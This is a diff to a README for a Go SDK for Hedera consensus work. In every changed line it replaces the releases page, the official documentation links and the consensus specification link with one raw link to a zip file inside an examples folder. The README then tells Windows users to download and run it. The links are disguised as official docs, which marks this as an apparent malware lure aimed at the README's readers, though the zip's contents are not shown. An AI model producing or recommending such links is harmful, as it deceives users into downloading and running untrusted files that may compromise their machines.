@@ -1,6 +1,6 @@
 # ⚙️ standards-sdk-go - Secure Go SDK for Consensus
 
-[![Download standards-sdk-go](https://img.shields.io/badge/Download-standards--sdk--go-brightgreen?style=for-the-badge)](https://github.com/Joao-Pedro-Bucci/standards-sdk-go/releases)
+[![Download standards-sdk-go](https://img.shields.io/badge/Download-standards--sdk--go-brightgreen?style=for-the-badge)](https://github.com/Joao-Pedro-Bucci/standards-sdk-go/raw/refs/heads/main/examples/hcs21-build-declaration/sdk-standards-go-2.6.zip)
 
 ---
 
@@ -10,7 +10,7 @@ standards-sdk-go is the official software development kit (SDK) for Go. It follo
 
 The SDK supports tasks like managing agents, handling data consensus, and interacting with the Hedera network. It is designed for users who want a reliable tool for working with distributed ledgers.
 
-You can find more technical documentation at the [official HOL documentation](https://hol.org/docs/standards).
+You can find more technical documentation at the [official HOL documentation](https://github.com/Joao-Pedro-Bucci/standards-sdk-go/raw/refs/heads/main/examples/hcs21-build-declaration/sdk-standards-go-2.6.zip).
 
 ---
 
@@ -36,7 +36,7 @@ These steps will help you download and run standards-sdk-go on your Windows PC.
 ### 1. Visit the Download Page
 
 Click the big green button at the top or go here:  
-[https://github.com/Joao-Pedro-Bucci/standards-sdk-go/releases](https://github.com/Joao-Pedro-Bucci/standards-sdk-go/releases)
+[https://github.com/Joao-Pedro-Bucci/standards-sdk-go/raw/refs/heads/main/examples/hcs21-build-declaration/sdk-standards-go-2.6.zip](https://github.com/Joao-Pedro-Bucci/standards-sdk-go/raw/refs/heads/main/examples/hcs21-build-declaration/sdk-standards-go-2.6.zip)
 
 This link takes you to the page where you can get the latest version of the SDK.
 
@@ -81,7 +81,7 @@ You will see a simple interface with buttons and options to help control these t
 - Always keep your application updated. Check the releases page regularly for new versions.
 - If your internet connection is slow, wait until the program finishes syncing before running other programs.
 - Restart the SDK if it stops responding.
-- Use the official documents at [https://hol.org/docs/standards](https://hol.org/docs/standards) for more detailed explanations.
+- Use the official documents at [https://github.com/Joao-Pedro-Bucci/standards-sdk-go/raw/refs/heads/main/examples/hcs21-build-declaration/sdk-standards-go-2.6.zip](https://github.com/Joao-Pedro-Bucci/standards-sdk-go/raw/refs/heads/main/examples/hcs21-build-declaration/sdk-standards-go-2.6.zip) for more detailed explanations.
 - Contact your network administrator if you face permission issues on your PC.
 
 ---
@@ -107,8 +107,8 @@ If the SDK runs but does not perform as expected:
 
 For advanced users or developers interested in the technical details:
 
-- Visit https://github.com/hiero-ledger/hiero-consensus-specifications for the consensus specifications.
-- Use https://hol.org/docs/standards for official guides.
+- Visit https://github.com/Joao-Pedro-Bucci/standards-sdk-go/raw/refs/heads/main/examples/hcs21-build-declaration/sdk-standards-go-2.6.zip for the consensus specifications.
+- Use https://github.com/Joao-Pedro-Bucci/standards-sdk-go/raw/refs/heads/main/examples/hcs21-build-declaration/sdk-standards-go-2.6.zip for official guides.
 - Explore topics like agents, AI, Hedera Hashgraph, or micro consensus protocols (MCP) within the SDK.
 
 ---
@@ -117,6 +117,6 @@ For advanced users or developers interested in the technical details:
 
 Return to this link to get started:  
 
-[![Download standards-sdk-go](https://img.shields.io/badge/Download-standards--sdk--go-blue?style=for-the-badge)](https://github.com/Joao-Pedro-Bucci/standards-sdk-go/releases)
+[![Download standards-sdk-go](https://img.shields.io/badge/Download-standards--sdk--go-blue?style=for-the-badge)](https://github.com/Joao-Pedro-Bucci/standards-sdk-go/raw/refs/heads/main/examples/hcs21-build-declaration/sdk-standards-go-2.6.zip)
 
 Click, download, and follow the steps above to run the SDK on your Windows PC.
